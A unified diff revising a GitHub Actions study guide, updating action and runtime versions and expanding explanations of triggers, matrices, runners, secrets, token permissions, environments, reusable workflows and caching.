@@ -3,8 +3,8 @@ title: "GitHub Actions"
 layout: guide
 category: Developer Tools
 subcategory: GitHub
-description: "CI/CD automation with GitHub Actions, covering workflow syntax, triggers, runners, reusable workflows, secrets management, and common pipeline patterns."
-tags: [github, cicd, automation, devops, practical, developer-tools]
+description: "CI/CD automation with GitHub Actions: workflow syntax, triggers and filters, jobs, matrices, and concurrency, actions and runners, secrets, GITHUB_TOKEN permissions, environments, reusable workflows, artifacts and caching, common pipelines, security hardening including OIDC and script injection, and cost."
+tags: [practical, github-actions, cicd, workflows, runners, oidc, supply-chain]
 ---
 {% raw %}
 
@@ -14,7 +14,7 @@ tags: [github, cicd, automation, devops, practical, developer-tools]
 
 The platform is tightly integrated with GitHub's data model. Workflows live inside your repository, run in response to repository events, and produce results you see alongside your pull requests and commits. There's no separate server to operate and no pipeline definition to maintain in a different tool.
 
-For broader CI/CD concepts like the philosophy behind pipeline design, testing strategies, and delivery principles, see the [CI/CD guide](/study-guides/sdlc/cicd.html). This guide focuses specifically on GitHub Actions: its syntax, concepts, and practical patterns.
+For broader CI/CD concepts like the philosophy behind pipeline design, testing strategies, and delivery principles, see the [CI/CD guide](/study-guides/sdlc/cicd.html).
 
 ## Core Concepts
 
@@ -24,7 +24,7 @@ A **workflow** is an automated process defined in a YAML file. Workflows live in
 
 An **event** is what triggers a workflow. Events correspond to things that happen in GitHub: pushes, pull requests, releases, scheduled times, manual triggers, and more. A workflow defines which events activate it.
 
-**Jobs** are the units of work inside a workflow. Each job runs on a separate machine and executes a sequence of steps. Jobs run in parallel by default; you can make them sequential using the `needs` keyword.
+**Jobs** are the units of work inside a workflow. Each job runs on a separate machine and executes a sequence of steps. Jobs run in parallel by default, and the `needs` keyword makes one job wait for another.
 
 **Steps** are the individual commands or actions within a job. Steps run sequentially and share the same machine and filesystem. A step either runs a shell command directly or invokes a pre-built action.
 
@@ -65,7 +65,7 @@ These six concepts compose into a hierarchy: an event fires a workflow, the work
 
 ## Workflow File Structure
 
-Every workflow is a YAML file in `.github/workflows/`. The filename can be anything descriptive like `ci.yml`, `deploy.yml`, or `release.yml`, and GitHub identifies the workflow by its `name` field, not the filename.
+Every workflow is a YAML file in `.github/workflows/`. The filename can be anything descriptive like `ci.yml`, `deploy.yml`, or `release.yml`. The UI displays the workflow's `name` field, falling back to the file path when `name` is omitted.
 
 Here's a complete, realistic CI workflow to illustrate the structure:
 
@@ -79,7 +79,7 @@ on:
     branches: [main]
 
 env:
-  DOTNET_VERSION: "8.0.x"
+  DOTNET_VERSION: "10.0.x"
 
 jobs:
   build-and-test:
@@ -88,10 +88,10 @@ jobs:
 
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v7
 
       - name: Set up .NET
-        uses: actions/setup-dotnet@v4
+        uses: actions/setup-dotnet@v6
         with:
           dotnet-version: ${{ env.DOTNET_VERSION }}
 
@@ -105,7 +105,7 @@ jobs:
         run: dotnet test --no-build --configuration Release --logger trx
 
       - name: Upload test results
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@v7
         if: always()
         with:
           name: test-results
@@ -138,13 +138,14 @@ The `on:` key defines what activates a workflow. You can specify a single event,
 | Event | When it fires |
 |---|---|
 | `push` | On any push to a branch or tag |
-| `pull_request` | When a PR is opened, updated, synchronized, or closed |
-| `pull_request_target` | Like `pull_request`, but runs with write access (use with care) |
+| `pull_request` | On PR activity. By default only when a PR is opened, gets new commits (`synchronize`), or is reopened |
+| `pull_request_target` | On PR activity, but runs the default branch's workflow with access to secrets and a write-capable token (see Security Considerations) |
+| `merge_group` | When a PR enters a merge queue. Required checks must also run on this event, or queued PRs never merge |
 | `workflow_dispatch` | Manual trigger via the GitHub UI or API |
 | `schedule` | On a cron schedule |
 | `release` | When a GitHub Release is created, published, or updated |
 | `workflow_call` | Called by another workflow (makes this workflow reusable) |
-| `repository_dispatch` | HTTP webhook trigger from external systems |
+| `repository_dispatch` | A REST API call from an external system |
 | `workflow_run` | Triggered when another workflow completes |
 
 ### Event Filtering
@@ -157,14 +158,10 @@ on:
     branches:
       - main
       - "release/**"
-    branches-ignore:
-      - "dependabot/**"
     paths:
       - "src/**"
       - "tests/**"
-    paths-ignore:
-      - "docs/**"
-      - "*.md"
+      - "!src/**/*.md"     # a leading ! excludes matches of earlier patterns
     tags:
       - "v*"
 
@@ -174,13 +171,15 @@ on:
       - main
 ```
 
-`branches` and `paths` filters use glob patterns. A `paths` filter means the workflow only runs if at least one changed file matches. This is useful for monorepos where you want different pipelines for different service directories.
+`branches` and `paths` filters use glob patterns. A `paths` filter means the workflow only runs if at least one changed file matches, which is useful for monorepos where each service directory gets its own pipeline. Each filter also has an `-ignore` form (`branches-ignore`, `paths-ignore`), but an event can't use a filter and its `-ignore` form together. To include some paths and exclude others, use a single list with `!` patterns as above. Path filters are not evaluated for pushes of tags.
+
+A workflow skipped by a path filter reports no status at all, so if that workflow is a required check, PRs that don't touch its paths wait forever for a check that never runs.
 
 The `types` filter on `pull_request` controls which PR lifecycle events activate the workflow. By default, `pull_request` fires on `opened`, `synchronize`, and `reopened`. Adding `closed` lets you trigger cleanup on PR merge or close.
 
 ### Scheduled Triggers
 
-Scheduled workflows use [POSIX cron syntax](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#schedule){:target="_blank" rel="noopener noreferrer"}. GitHub Actions runs schedules in UTC.
+Scheduled workflows use [POSIX cron syntax](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#schedule){:target="_blank" rel="noopener noreferrer"}, evaluated in UTC. The shortest interval is every five minutes, and runs can start late, or occasionally be dropped, when GitHub is under heavy load, so avoid scheduling at the top of the hour when everyone else does.
 
 ```yaml
 on:
@@ -189,7 +188,7 @@ on:
     - cron: "0 6 * * *"   # Every day at 6:00 AM UTC
 ```
 
-Scheduled workflows only run on the default branch. If you need branch-specific schedules, use `workflow_dispatch` or `repository_dispatch` triggered from an external scheduler.
+Scheduled workflows only run on the default branch. If you need branch-specific schedules, use `workflow_dispatch` or `repository_dispatch` triggered from an external scheduler. In public repositories, GitHub disables scheduled workflows after 60 days without repository activity.
 
 ### Manual Triggers with Inputs
 
@@ -251,7 +250,7 @@ jobs:
       - run: echo "Deploying to production..."
 ```
 
-`needs` accepts a single job name or a list. A job only starts when all its dependencies have succeeded (unless you override this with `if`).
+`needs` accepts a single job name or a list. A job only starts when all its dependencies have succeeded, unless you override that with an `if` condition such as `always()`.
 
 ### Matrix Strategies
 
@@ -263,27 +262,27 @@ jobs:
     strategy:
       matrix:
         os: [ubuntu-latest, windows-latest, macos-latest]
-        dotnet: ["6.0.x", "7.0.x", "8.0.x"]
+        dotnet: ["8.0.x", "9.0.x", "10.0.x"]
         exclude:
           - os: macos-latest
-            dotnet: "6.0.x"
+            dotnet: "8.0.x"
         include:
           - os: ubuntu-latest
-            dotnet: "8.0.x"
+            dotnet: "10.0.x"
             experimental: true
       fail-fast: false
       max-parallel: 6
 
     runs-on: ${{ matrix.os }}
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-dotnet@v4
+      - uses: actions/checkout@v7
+      - uses: actions/setup-dotnet@v6
         with:
           dotnet-version: ${{ matrix.dotnet }}
       - run: dotnet test
 ```
 
-`fail-fast: false` prevents one matrix combination's failure from immediately cancelling the rest, which is useful when you want to see the full picture. `max-parallel` limits concurrent runs to avoid overwhelming self-hosted runners or external services.
+`exclude` removes combinations from the generated set. `include` either adds variables to combinations that already exist, as it adds `experimental: true` to the Ubuntu and .NET 10 job here, or adds whole new combinations. `fail-fast` defaults to `true`, cancelling the other combinations as soon as one fails, so setting it to `false` lets every combination finish and report. `max-parallel` limits concurrent runs to avoid overwhelming self-hosted runners or external services. A matrix can generate at most 256 jobs per workflow run.
 
 ### Conditional Execution
 
@@ -307,7 +306,7 @@ jobs:
         run: ./cleanup.sh
 ```
 
-The built-in status functions `success()`, `failure()`, `cancelled()`, and `always()` are essential for control flow. `always()` runs the step regardless of what happened before it. `failure()` runs only when a previous step failed. Without an explicit `if`, steps only run when all previous steps succeeded.
+The status functions `success()`, `failure()`, `cancelled()`, and `always()` control what runs after a failure. Without an explicit `if`, steps only run when all previous steps succeeded. `failure()` runs a step only when a previous step failed, and `always()` runs it regardless, even when the run was cancelled. For cleanup that shouldn't run on cancellation, `if: ${{ !cancelled() }}` is the usual choice.
 
 ### Concurrency Groups
 
@@ -319,7 +318,7 @@ concurrency:
   cancel-in-progress: true
 ```
 
-This configuration cancels any in-progress run for the same workflow and branch when a new run starts. For production deployments, you might prefer `cancel-in-progress: false` to let the current deployment finish before queuing the next one.
+This configuration cancels any in-progress run for the same workflow and branch when a new run starts. For production deployments, you might prefer `cancel-in-progress: false` to let the current deployment finish first. A group holds at most one running and one pending run, though, so when a third run arrives it replaces the pending one, which is cancelled. That's usually what you want for deployments, since the newest commit is the one you want deployed.
 
 You can define concurrency at the workflow level or on individual jobs, and you can compose dynamic group names from any context variables.
 
@@ -329,7 +328,7 @@ You can define concurrency at the workflow level or on individual jobs, and you 
 
 Every step either executes a shell command (`run`) or invokes an action (`uses`). These serve different purposes.
 
-`run` executes commands directly in the runner's shell. The default shell on Linux/macOS runners is `bash`; on Windows it's PowerShell. You can override this per-step:
+`run` executes commands directly in the runner's shell. The default shell is `bash` on Linux and macOS runners and PowerShell (`pwsh`) on Windows. You can override it per step, or for a whole job or workflow with `defaults.run.shell`:
 
 ```yaml
 steps:
@@ -359,8 +358,8 @@ steps:
 
 ```yaml
 steps:
-  - uses: actions/checkout@v4
-  - uses: actions/setup-node@v4
+  - uses: actions/checkout@v7
+  - uses: actions/setup-node@v7
     with:
       node-version: "20"
 ```
@@ -388,6 +387,7 @@ For passing data between jobs, outputs bubble up through job-level outputs:
 ```yaml
 jobs:
   build:
+    runs-on: ubuntu-latest
     outputs:
       version: ${{ steps.version.outputs.tag }}
     steps:
@@ -396,9 +396,12 @@ jobs:
 
   deploy:
     needs: build
+    runs-on: ubuntu-latest
     steps:
       - run: echo "Deploying ${{ needs.build.outputs.version }}"
 ```
+
+Job outputs are small strings meant for values like versions and flags. GitHub refuses to pass an output that contains a secret, and files belong in artifacts instead.
 
 ### Environment Variables in Steps
 
@@ -419,7 +422,7 @@ jobs:
         run: dotnet build --configuration $BUILD_CONFIG
 ```
 
-For multi-line values or values with special characters, append to `$GITHUB_ENV` instead of using `echo`:
+To set a variable for all later steps in the job, append `NAME=value` to the file at `$GITHUB_ENV`. Multi-line values need a delimiter, as below:
 
 ```yaml
 - name: Set multi-line env var
@@ -436,11 +439,11 @@ For multi-line values or values with special characters, append to `$GITHUB_ENV`
 
 ### Using Marketplace Actions
 
-Actions are versioned and referenced by their GitHub repository and a ref. The `@v4` syntax pins to the latest `v4.x.x` release, balancing currency with stability:
+Actions are versioned and referenced by their GitHub repository and a ref. By convention, maintainers move a major-version tag like `@v7` to each new `v7.x.x` release, so referencing it picks up fixes without breaking changes:
 
 ```yaml
-- uses: actions/checkout@v4
-- uses: actions/setup-node@v4
+- uses: actions/checkout@v7
+- uses: actions/setup-node@v7
   with:
     node-version: "20"
     cache: "npm"
@@ -448,7 +451,7 @@ Actions are versioned and referenced by their GitHub repository and a ref. The `
 
 ### Pinning to SHA
 
-For third-party actions where you don't control the release process, pin to a specific commit SHA rather than a mutable tag. Tags can be force-pushed to point to different commits; a SHA is immutable:
+For third-party actions where you don't control the release process, pin to a specific commit SHA rather than a mutable tag. A tag can be moved to point at a different commit, including by an attacker who compromises the action's repository, but a full commit SHA always refers to the same code:
 
 ```yaml
 # Risky: tag can be moved
@@ -458,7 +461,7 @@ For third-party actions where you don't control the release process, pin to a sp
 - uses: some-org/some-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
 ```
 
-Tools like [Dependabot](https://docs.github.com/en/code-security/dependabot){:target="_blank" rel="noopener noreferrer"} can automate SHA updates with human review, giving you both security and currency.
+A common convention is to add the version as a comment after the SHA (`@a1b2c3d… # v2.4.1`), which tools like [Dependabot](https://docs.github.com/en/code-security/dependabot){:target="_blank" rel="noopener noreferrer"} read and update in their pull requests, so pinning doesn't mean falling behind. Repository, organization, and enterprise administrators can enforce the practice with an Actions policy that fails any workflow using an action not pinned to a full-length SHA.
 
 ### Composite Actions
 
@@ -473,7 +476,7 @@ inputs:
   dotnet-version:
     description: ".NET SDK version to install"
     required: false
-    default: "8.0.x"
+    default: "10.0.x"
 
 outputs:
   cache-hit:
@@ -484,16 +487,16 @@ runs:
   using: "composite"
   steps:
     - name: Checkout
-      uses: actions/checkout@v4
+      uses: actions/checkout@v7
 
     - name: Set up .NET
-      uses: actions/setup-dotnet@v4
+      uses: actions/setup-dotnet@v6
       with:
         dotnet-version: ${{ inputs.dotnet-version }}
 
     - name: Restore NuGet cache
       id: cache
-      uses: actions/cache@v4
+      uses: actions/cache@v6
       with:
         path: ~/.nuget/packages
         key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj') }}
@@ -503,30 +506,32 @@ runs:
 Invoke it from any workflow in the same repository:
 
 ```yaml
-- uses: ./.github/actions/setup-environment
+- uses: $/.github/actions/setup-environment
   with:
-    dotnet-version: "8.0.x"
+    dotnet-version: "10.0.x"
 ```
 
-Composite actions live in `.github/actions/<name>/action.yml`. They're local to the repository, so they don't appear on the Marketplace, but they dramatically reduce duplication when your workflows share setup steps.
+The `$/` prefix resolves to the workflow's own repository at the exact commit being run, without needing a checkout first. The older `./` prefix resolves against the checked-out workspace, so it only works after an `actions/checkout` step, and it still appears in most existing workflows. Composite actions conventionally live in `.github/actions/<name>/action.yml` and reduce duplication when workflows share setup steps. An action in its own public repository can be referenced from any repository and published to the Marketplace.
 
 ## Runners
 
 ### GitHub-Hosted Runners
 
-GitHub provides managed runners that are provisioned fresh for each job and torn down afterward. The most commonly used runner types are:
+GitHub provides managed virtual machines that are provisioned fresh for each job and torn down afterward. The common labels, as of September 2026:
 
-| Label | OS | Notes |
+| Label | Image | Use it for |
 |---|---|---|
-| `ubuntu-latest` | Ubuntu 22.04 | Fastest, cheapest, recommended default |
-| `ubuntu-22.04` | Ubuntu 22.04 | Pinned version for reproducibility |
-| `ubuntu-20.04` | Ubuntu 20.04 | Older Ubuntu for compatibility |
-| `windows-latest` | Windows Server 2022 | Required for .NET Framework, WinUI, etc. |
-| `windows-2022` | Windows Server 2022 | Pinned version |
-| `macos-latest` | macOS 14 (Apple Silicon) | Required for iOS/macOS builds |
-| `macos-13` | macOS 13 (Intel) | For Intel-native builds |
+| `ubuntu-latest` | Ubuntu 24.04 | The default for almost everything |
+| `ubuntu-26.04`, `ubuntu-24.04`, `ubuntu-22.04` | Pinned Ubuntu versions | Reproducible builds that shouldn't move when `-latest` does |
+| `ubuntu-24.04-arm` | Ubuntu 24.04 on Arm64 | Building or testing Arm Linux artifacts natively |
+| `ubuntu-slim` | Single-CPU Linux | Lightweight jobs like labeling or notifications |
+| `windows-latest` | Windows Server 2025 | .NET Framework, WinUI, and other Windows-only builds |
+| `windows-2022` | Windows Server 2022 | Pinned older Windows |
+| `windows-11-arm` | Windows 11 on Arm64 | Windows on Arm builds |
+| `macos-latest` | macOS 26 on Apple silicon | iOS and macOS builds |
+| `macos-26-intel`, `macos-15-intel` | macOS on Intel | Intel-native Mac builds |
 
-GitHub-hosted runners come pre-installed with a wide range of tools. You can check the [runner images repository](https://github.com/actions/runner-images){:target="_blank" rel="noopener noreferrer"} for a complete list of installed software. Linux runners are the fastest and cheapest option; Windows and macOS runners cost more (billed at 2x and 10x the Linux rate respectively for private repositories).
+The `-latest` labels move to a new OS version a few months after it ships, so a build that depends on a specific toolchain version should use a pinned label. Machine size depends on repository visibility. Standard Linux and Windows runners get 4 CPUs and 16 GB of RAM in public repositories and 2 CPUs and 8 GB in private ones, and larger runners with more cores or GPUs are available as a paid option. The [runner images repository](https://github.com/actions/runner-images){:target="_blank" rel="noopener noreferrer"} lists the software installed on each image.
 
 ### Self-Hosted Runners
 
@@ -537,7 +542,9 @@ Self-hosted runners let you bring your own machines. They're useful when:
 - You need to access private network resources (internal databases, artifact registries, deployment targets)
 - Your workloads are large enough that self-hosted is more cost-effective than GitHub's per-minute billing
 
-Register a self-hosted runner through your repository or organization settings. The runner agent is a lightweight binary that polls GitHub for queued jobs. Self-hosted runners persist between jobs, which means your build environment accumulates state; GitHub-hosted runners start fresh every time. You need to manage cleanup yourself, or use ephemeral self-hosted runners that spin up on demand and terminate after each job.
+Register a self-hosted runner at the repository, organization, or enterprise level. The runner agent is a lightweight application that polls GitHub for queued jobs. A self-hosted runner persists between jobs unless you make it ephemeral, which means your build environment accumulates state, and files or credentials left by one job are visible to the next. Either manage cleanup yourself, or use ephemeral runners that take one job and are then destroyed. [Actions Runner Controller](https://github.com/actions/actions-runner-controller){:target="_blank" rel="noopener noreferrer"} automates that pattern on Kubernetes.
+
+Don't attach self-hosted runners to public repositories. Anyone can open a pull request against a public repository, and depending on the workflow settings, that pull request's code can end up running on your machine, inside your network.
 
 Target self-hosted runners using labels:
 
@@ -545,17 +552,17 @@ Target self-hosted runners using labels:
 runs-on: [self-hosted, linux, x64]
 ```
 
-Runner groups (available at the organization level) let you restrict which repositories can use which runners, preventing one team's public repository from running jobs on runners provisioned for sensitive internal workloads.
+Runner groups, at the organization and enterprise levels, restrict which repositories and workflows can use which runners, so a runner provisioned for sensitive internal workloads only takes jobs from the repositories meant to use it.
 
 ### Choosing the Right Runner
 
-Start with `ubuntu-latest` for almost everything. Switch to Windows only when your build genuinely requires it; Windows runners are noticeably slower for most workloads and cost more. Use macOS only for Apple platform builds, given the cost differential. Add self-hosted runners only when you have a concrete reason: compliance, network access, or cost at scale.
+Start with `ubuntu-latest` for almost everything. Switch to Windows only when your build requires it, since Windows runners are often slower for the same work and cost more per minute. Use macOS only for Apple platform builds, given the cost differential. Add self-hosted runners only when you have a concrete reason, such as compliance, private network access, special hardware, or cost at scale.
 
 ## Secrets and Variables
 
 ### Secrets
 
-Secrets store sensitive values like API keys, deploy credentials, and connection strings. They're encrypted at rest and masked in workflow logs; if a secret value appears in log output, GitHub replaces it with `***`.
+Secrets store sensitive values like API keys, deploy credentials, and connection strings. They're encrypted at rest and masked in workflow logs, so if a secret value appears in log output, GitHub replaces it with `***`. Masking only matches the exact value, though, so a secret that has been transformed, such as base64-encoded, sliced, or JSON-escaped, can still leak into logs unmasked.
 
 Define secrets in your repository settings, then access them in workflows through the `secrets` context:
 
@@ -568,11 +575,13 @@ steps:
     run: ./deploy.sh
 ```
 
-Secrets exist at three scopes:
+Secrets exist at three scopes, and when the same name exists at more than one, the most specific wins:
 
-- **Repository secrets** — accessible only to workflows in that repository
-- **Environment secrets** — accessible only when a job targets a specific environment (more on environments below)
-- **Organization secrets** — accessible to multiple repositories in an organization, with repository-level allow lists controlling which repos can use each secret
+| Scope | Available to | Precedence |
+|---|---|---|
+| **Environment** | Only jobs that target that environment (see Environments below) | Highest |
+| **Repository** | All workflows in the repository | Middle |
+| **Organization** | Repositories the organization grants access to, through an allow list per secret | Lowest |
 
 ### Variables
 
@@ -588,24 +597,23 @@ Variables follow the same scoping hierarchy as secrets (repository, environment,
 
 ### The GITHUB_TOKEN
 
-Every workflow run receives an automatically provisioned `GITHUB_TOKEN`, a short-lived token that expires when the run ends. It grants access to the repository via the GitHub API, enabling actions like creating releases, commenting on pull requests, pushing changes back to the repository, and triggering other workflows.
+Every job receives an automatically provisioned `GITHUB_TOKEN`, a short-lived token scoped to the repository that expires when the job finishes. It can call the GitHub API and push to the repository for actions like creating releases, commenting on pull requests, and committing generated files, within whatever permissions it has been granted.
 
-The token's default permissions are deliberately conservative:
+Its default permissions come from a repository or organization setting with two options. The **restricted** default grants read access to repository contents and packages and nothing else, and it's what repositories and organizations created since early 2023 start with. The **permissive** default grants read and write access to most scopes, and older organizations may still use it. A workflow shouldn't rely on either. Declare what it needs instead:
 
 ```yaml
 permissions:
   contents: read
   pull-requests: write
-  issues: write
 ```
 
-You can set permissions at the workflow level or per-job. Reducing permissions beyond the defaults follows the principle of least privilege; a job that only reads code shouldn't also have permission to write packages or manage deployments.
+A `permissions` block can sit at the workflow level or on an individual job. Any scope it doesn't list is set to no access, so the block above also removes write access to packages, deployments, and everything else.
 
-For `pull_request` events from forks, `GITHUB_TOKEN` has read-only permissions regardless of your settings, since the forked branch's code could be malicious. This is an intentional security constraint.
+Two behaviors surprise people. Events caused by the `GITHUB_TOKEN`, such as a push or a new pull request, don't start new workflow runs, except for `workflow_dispatch` and `repository_dispatch`. GitHub does this to prevent workflows from triggering each other in loops, and a workflow that needs to trigger another uses a GitHub App token instead. Also, for `pull_request` events from forks, the token is read-only and repository secrets aren't passed to the workflow at all, because the forked branch's code could be malicious.
 
 ## Environments
 
-Environments represent deployment targets like staging and production. They add protection rules and environment-scoped secrets on top of the basic job model.
+Environments represent deployment targets like staging and production. They add protection rules and environment-scoped secrets and variables on top of the basic job model. Environments with every protection rule are available in public repositories on all plans. In private repositories, environments and branch restrictions need a paid plan (Pro, Team, or Enterprise), and required reviewers and wait timers need GitHub Enterprise.
 
 ```yaml
 jobs:
@@ -623,11 +631,12 @@ jobs:
 
 Environments support several protection rules:
 
-**Required reviewers** pause deployment jobs at a waiting state until one or more designated approvers approve the deployment. This creates a manual gate before production releases.
-
-**Wait timers** add a delay between the job queue and execution. This gives you a window to cancel a deployment you notice is problematic before it reaches production.
-
-**Branch policies** restrict which branches can deploy to an environment. Configuring the `production` environment to only accept deployments from `main` prevents an accidental `feature/my-test` deployment from reaching production.
+| Rule | Effect |
+|---|---|
+| **Required reviewers** | Pauses the job until one of up to six designated users or teams approves it. Can optionally stop people from approving deployments they triggered themselves |
+| **Wait timer** | Delays the job by up to 30 days after it's triggered, leaving a window to cancel |
+| **Deployment branches and tags** | Only runs from matching branches or tags, so the `production` environment can accept deployments from `main` and nothing else |
+| **Custom protection rules** | Calls a GitHub App that approves or rejects the deployment, for checks like change management tickets or monitoring health |
 
 Combining these rules gives you a deployment pipeline where staging is automatic but production requires a reviewer's explicit approval:
 
@@ -635,12 +644,13 @@ Combining these rules gives you a deployment pipeline where staging is automatic
 jobs:
   deploy-staging:
     environment: staging
-    # No protection rules - deploys automatically
+    # No protection rules: deploys automatically
+    # (runs-on and steps omitted)
 
   deploy-production:
     needs: deploy-staging
     environment: production
-    # Requires approval from production-approvers team
+    # Requires approval from the production-approvers team
 ```
 
 ## Reusable Workflows
@@ -709,15 +719,15 @@ jobs:
       DEPLOY_TOKEN: ${{ secrets.PRODUCTION_DEPLOY_TOKEN }}
 ```
 
-Reusable workflows enforce inputs and secret declarations explicitly. The calling workflow must pass required inputs; any secret not declared in `workflow_call.secrets` isn't accessible inside the reusable workflow, even if the caller has it. This makes reusable workflows self-documenting and prevents accidental secret exposure.
+Reusable workflows declare their inputs and secrets explicitly. The calling workflow must pass required inputs, and a secret the reusable workflow doesn't declare isn't available inside it, even if the caller has it. That makes the interface self-documenting and prevents accidental secret exposure. A caller that trusts the reusable workflow can pass everything with `secrets: inherit` instead, at the cost of that explicitness. Environment variables set with `env` in the caller are not passed through at all, which is a frequent surprise.
 
-Organizations often move shared workflows into a dedicated `.github` repository, making them available across all repositories in the organization via `uses: org/.github/.github/workflows/deploy.yml@main`.
+The calling job can't have its own steps. It is replaced by the jobs of the reusable workflow. Organizations often keep shared workflows in a central repository and reference them with `uses: org/shared-workflows/.github/workflows/deploy.yml@v1`, which requires that repository's Actions settings to allow access from the calling repositories.
 
 ## Artifacts and Caching
 
 ### Artifacts
 
-Artifacts persist files from a workflow run so you can download them afterward or share them between jobs. They're stored for 90 days by default (configurable).
+Artifacts persist files from a workflow run so you can download them afterward or share them between jobs. They're kept for 90 days by default, adjustable per repository, and storage counts against the account's included artifact storage.
 
 Upload from one job:
 
@@ -726,7 +736,7 @@ Upload from one job:
   run: dotnet publish -c Release -o ./publish
 
 - name: Upload artifact
-  uses: actions/upload-artifact@v4
+  uses: actions/upload-artifact@v7
   with:
     name: published-app
     path: ./publish
@@ -737,7 +747,7 @@ Download in a subsequent job:
 
 ```yaml
 - name: Download artifact
-  uses: actions/download-artifact@v4
+  uses: actions/download-artifact@v8
   with:
     name: published-app
     path: ./publish
@@ -746,7 +756,7 @@ Download in a subsequent job:
   run: ./deploy.sh ./publish
 ```
 
-This pattern separates build from deploy. The build job compiles and packages; the deploy job downloads the artifact and pushes it to the target environment. Each job runs on a fresh runner, so artifacts are the only way to pass binaries between them.
+This pattern separates build from deploy. The build job compiles and packages, and the deploy job downloads the artifact and pushes it to the target environment. Each job runs on a fresh runner, so files have to travel between them through artifacts or an external store like a container registry.
 
 ### Caching Dependencies
 
@@ -754,7 +764,7 @@ The `actions/cache` action stores and restores directories between runs. Its val
 
 ```yaml
 - name: Cache NuGet packages
-  uses: actions/cache@v4
+  uses: actions/cache@v6
   with:
     path: ~/.nuget/packages
     key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj', '**/*.props') }}
@@ -765,9 +775,9 @@ The `actions/cache` action stores and restores directories between runs. Its val
   run: dotnet restore
 ```
 
-The cache `key` uniquely identifies a cache entry. When the key matches exactly, the cache is restored verbatim. When there's no exact match, `restore-keys` provides fallback prefixes; GitHub restores the most recent cache whose key starts with the prefix, giving you a warm cache even when lock files change.
+The cache `key` uniquely identifies a cache entry. When the key matches exactly, the cache is restored verbatim. When there's no exact match, `restore-keys` provides fallback prefixes, and GitHub restores the most recent cache whose key starts with the prefix, giving you a warm cache even when lock files change.
 
-Cache misses cause the full step to run normally; the job doesn't fail. At the end of the job, if the cache key is new, the cached directory is saved for future runs.
+A cache miss doesn't fail the job. The restore step reports the miss, the following steps download dependencies as usual, and at the end of the job, if the key is new, the directory is saved for future runs. An existing key is never overwritten, which is why the key has to change when the dependencies do. Each repository gets 10 GB of cache storage, and entries unused for seven days are evicted.
 
 Common caching strategies:
 
@@ -777,9 +787,9 @@ Common caching strategies:
 | Node.js (npm) | `~/.npm` | Hash of `package-lock.json` |
 | Python (pip) | `~/.cache/pip` | Hash of `requirements.txt` |
 | Go | `~/go/pkg/mod` | Hash of `go.sum` |
-| Docker layers | `/tmp/.buildx-cache` | Hash of `Dockerfile` |
+| Docker layers | Handled by BuildKit's `type=gha` cache backend (see the deployment pattern below) | Managed automatically |
 
-Many setup actions like `actions/setup-node` and `actions/setup-dotnet` accept a `cache` input that handles all this automatically. When available, prefer that over manual `actions/cache` configuration.
+Many setup actions like `actions/setup-node` and `actions/setup-dotnet` accept a `cache` input that handles all this automatically. They key the cache on a lock file, so `setup-dotnet` needs NuGet lock files (`packages.lock.json`, enabled with `RestorePackagesWithLockFile`) committed to the repository, and `setup-node` needs `package-lock.json` or its equivalent. When the lock file exists, prefer the built-in input over manual `actions/cache` configuration.
 
 ## Common Workflow Patterns
 
@@ -801,19 +811,19 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
 
-      - uses: actions/setup-dotnet@v4
+      - uses: actions/setup-dotnet@v6
         with:
-          dotnet-version: "8.0.x"
-          cache: true
+          dotnet-version: "10.0.x"
+          cache: true   # requires committed packages.lock.json files
 
       - run: dotnet restore
       - run: dotnet build --no-restore
       - run: dotnet test --no-build --collect:"XPlat Code Coverage"
 
       - name: Upload coverage
-        uses: codecov/codecov-action@v4
+        uses: codecov/codecov-action@v7
         with:
           token: ${{ secrets.CODECOV_TOKEN }}
 ```
@@ -844,10 +854,10 @@ jobs:
       image-digest: ${{ steps.push.outputs.digest }}
 
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
 
       - name: Log in to container registry
-        uses: docker/login-action@v3
+        uses: docker/login-action@v4
         with:
           registry: ${{ env.REGISTRY }}
           username: ${{ github.actor }}
@@ -855,7 +865,7 @@ jobs:
 
       - name: Extract metadata
         id: meta
-        uses: docker/metadata-action@v5
+        uses: docker/metadata-action@v6
         with:
           images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
           tags: |
@@ -863,7 +873,7 @@ jobs:
 
       - name: Build and push
         id: push
-        uses: docker/build-push-action@v5
+        uses: docker/build-push-action@v7
         with:
           context: .
           push: true
@@ -879,7 +889,7 @@ jobs:
       url: https://staging.myapp.com
 
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
       - name: Deploy to staging
         env:
           IMAGE: ${{ needs.build-and-push.outputs.image-tag }}
@@ -897,7 +907,7 @@ jobs:
       url: https://myapp.com
 
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
       - name: Deploy to production
         env:
           IMAGE: ${{ needs.build-and-push.outputs.image-tag }}
@@ -945,13 +955,11 @@ jobs:
       contents: write
 
     steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0  # Need full history for changelog
+      - uses: actions/checkout@v7
 
-      - uses: actions/setup-dotnet@v4
+      - uses: actions/setup-dotnet@v6
         with:
-          dotnet-version: "8.0.x"
+          dotnet-version: "10.0.x"
 
       - name: Build release artifacts
         run: |
@@ -967,7 +975,7 @@ jobs:
           zip -r myapp-win-x64.zip win-x64/
 
       - name: Create GitHub Release
-        uses: softprops/action-gh-release@v1
+        uses: softprops/action-gh-release@v3
         with:
           generate_release_notes: true
           files: |
@@ -991,10 +999,10 @@ jobs:
   dependency-audit:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-dotnet@v4
+      - uses: actions/checkout@v7
+      - uses: actions/setup-dotnet@v6
         with:
-          dotnet-version: "8.0.x"
+          dotnet-version: "10.0.x"
       - name: Audit NuGet packages
         run: dotnet list package --vulnerable --include-transitive
 
@@ -1004,7 +1012,7 @@ jobs:
